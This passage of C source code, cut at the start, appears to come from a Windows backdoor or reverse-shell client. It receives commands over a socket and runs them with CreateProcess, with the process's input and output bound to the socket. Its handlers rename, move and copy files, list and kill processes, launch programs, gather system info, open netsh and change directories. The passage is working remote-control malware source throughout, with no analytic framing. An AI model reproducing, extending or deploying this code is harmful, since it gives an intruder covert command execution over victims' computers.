                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(StartsWith(recvdata,"ren")){
                        char command[BUFFER_SIZE] = "cmd.exe /C ren ";

                        char split_buffer[BUFFER_SIZE];

                        strcpy(split_buffer,recvdata);

                        char *split_file = strtok(split_buffer," ");

                        split_file = strtok(NULL," "); //file one

                        strcat(command,split_file); // add file one in char command
                        strcat(command," ");
                        split_file = strtok(NULL," "); // file two
                        char *folder_file2 = strtok(split_file,"\n");
                        strcat(command,folder_file2); // output cmd.exe /C ren file_one file_two
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(StartsWith(recvdata,"move")){
                        char command[BUFFER_SIZE] = "cmd.exe /C move ";

                        char split_buffer[BUFFER_SIZE];

                        strcpy(split_buffer,recvdata);

                        char *split_file = strtok(split_buffer," ");

                        split_file = strtok(NULL," "); //file one

                        strcat(command,split_file); // add file one in char command
                        strcat(command," ");
                        split_file = strtok(NULL," "); // file two
                        char *folder_file2 = strtok(split_file,"\n");
                        strcat(command,folder_file2); // output cmd.exe /C ren file_one file_two
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }


                    else if(StartsWith(recvdata,"copy")){
                        char command[BUFFER_SIZE] = "cmd.exe /C copy ";

                        char split_buffer[BUFFER_SIZE];

                        strcpy(split_buffer,recvdata);

                        char *split_file = strtok(split_buffer," ");

                        split_file = strtok(NULL," "); //file one

                        strcat(command,split_file); // add file one in char command
                        strcat(command," ");
                        split_file = strtok(NULL," "); // file two
                        char *folder_file2 = strtok(split_file,"\n");
                        strcat(command,folder_file2); // output cmd.exe /C copy file_one file_two
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(strcmp(recvdata,"tasklist\n")==0)
                    {
                        char command[BUFFER_SIZE] = "cmd.exe /C tasklist";
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(StartsWith(recvdata,"process")){
                        char command[BUFFER_SIZE] = "cmd.exe /C start ";

                        char split_buffer[BUFFER_SIZE];

                        strcpy(split_buffer,recvdata);

                        char *split_file = strtok(split_buffer," ");

                        split_file = strtok(NULL," "); //file one
                        strcat(command,split_file); // cmd.exe /C start <process.exe>
                        strcat(command," &");
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(StartsWith(recvdata,"taskkill")){
                        char command[BUFFER_SIZE] = "cmd.exe /C taskkill /F /IM ";
                        char split_buffer[BUFFER_SIZE];
                        strcpy(split_buffer,recvdata);
                        char *split_process_kill = strtok(split_buffer," ");
                        split_process_kill = strtok(NULL," ");
                        strcat(command,split_process_kill);
                        strcat(command," &");
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }


                    else if(StartsWith(recvdata,"sysinfo")){
                        char Process[] = "cmd.exe /c systeminfo";
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(strcmp(recvdata,"netsh\n")==0){
                        char Process[] = "netsh.exe";
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if(StartsWith(recvdata,"systeminfo")){
                        char Process[] = "cmd.exe /c systeminfo";
                        STARTUPINFO sinfo;
                        PROCESS_INFORMATION pinfo;
                        memset(&sinfo, 0, sizeof(sinfo));
                        sinfo.cb = sizeof(sinfo);
                        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) socks;
                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                        WaitForSingleObject(pinfo.hProcess, INFINITE);
                        CloseHandle(pinfo.hProcess);
                        CloseHandle(pinfo.hThread);
                    }

                    else if (StartsWith(recvdata,"cd"))
                    {
                        char split_path[BUFFER_SIZE];
                        strcpy(split_path,recvdata);
                        char *cd_dir = strtok(split_path," ");
                        cd_dir = strtok(NULL," ");
                        char split_cn[BUFFER_SIZE] = "\n";
                        char *cd_dir2 = strtok(cd_dir,split_cn);

                        //printf("%s",cd_dir2);
                        if(isDirectoryExists(cd_dir2)==1)
                        {
                            //dirrectory True
                            
                            char split_path[BUFFER_SIZE];
                            strcpy(split_path,recvdata);
                            char *cd_dir = strtok(split_path," ");
                            cd_dir = strtok(NULL," ");
                            char split_cn[BUFFER_SIZE] = "\n";
                            char *cd_dir2 = strtok(cd_dir,split_cn);
                            chdir(cd_dir2);
                            strcat(cd_dir2,"\n\n");
                            char current_path[BUFFER_SIZE];
                            GetCurrentDir(current_path,BUFFER_SIZE);
                            char change_dirrectory[BUFFER_SIZE] = "[*] Dirrectory Changed : ";
                            strcat(change_dirrectory,current_path);
                            strcat(change_dirrectory,"\n");
                            send(socks,change_dirrectory,strlen(change_dirrectory)+1,0);
                        }
                        
                        /*else if(check_path(cd_dir)==1){
                            char not_dir[BUFFER_SIZE] = "[*] Not Dirrectory !\n";
                            send(socks,not_dir,strlen(not_dir)+1,0);
                        }*/

                        else{
                            char dir_not_found[BUFFER_SIZE]="[*] Dir not found !\n";
                            send(socks,dir_not_found,strlen(dir_not_found)+1,0);
                        }
                    }
                    else{
                        char response[BUFFER_SIZE] = "[*] ";
                        char split_current_n[BUFFER_SIZE];
                        strtok(recvdata,"\n");
                        strcat(response,recvdata);
                        strcat(response," Error Command Not Found !\n");
                        send(socks,response,strlen(response)+1,0);
                    }
                }
            }
        }
    }
    closesocket(socks);
}
